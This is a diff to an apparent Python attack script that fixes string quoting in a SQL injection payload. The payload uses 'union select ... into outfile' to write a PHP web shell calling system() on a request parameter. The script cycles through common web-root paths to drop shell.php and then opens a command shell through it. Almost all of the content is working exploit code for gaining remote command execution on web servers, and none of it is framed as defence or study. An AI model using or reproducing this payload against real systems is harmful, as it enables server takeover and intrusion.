@@ -56,7 +56,7 @@ def exploit(url, param, payload):
 
 def overwrite_file(url, param, filepath):
     print(f"[+] Attempting to overwrite {filepath}...\n")
-    payload = f"' union select '<?php system($_GET["cmd"]);?>' into outfile '{filepath}' -- -"
+    payload = f"""' union select '<?php system($_GET["cmd"]);?>' into outfile '{filepath}' -- -"""
 
     if exploit(url, param, payload):
         print(f"[+] Successfully overwritten {filepath}...\n")
@@ -68,7 +68,7 @@ def shell_mode(url, param):
     paths = ['./', '/var/www/html/', '/var/www/', '/home/user/htdocs/', '/www/', '/public_html/', '/var/www/html/example.com/public_html/', '/usr/local/nginx/html/']
     
     for path in paths:
-        payload = f"' union select '<?php system($_GET["cmd"]);?>' into outfile '{path}shell.php' -- -"
+        payload = f"""' union select '<?php system($_GET["cmd"]);?>' into outfile '{path}shell.php' -- -"""
         if exploit(url, param, payload):
             print(f"[+] Webshell successfully uploaded to {path}shell.php. Entering shell mode...\n")
             web_shell = f"{url}/shell.php?cmd="
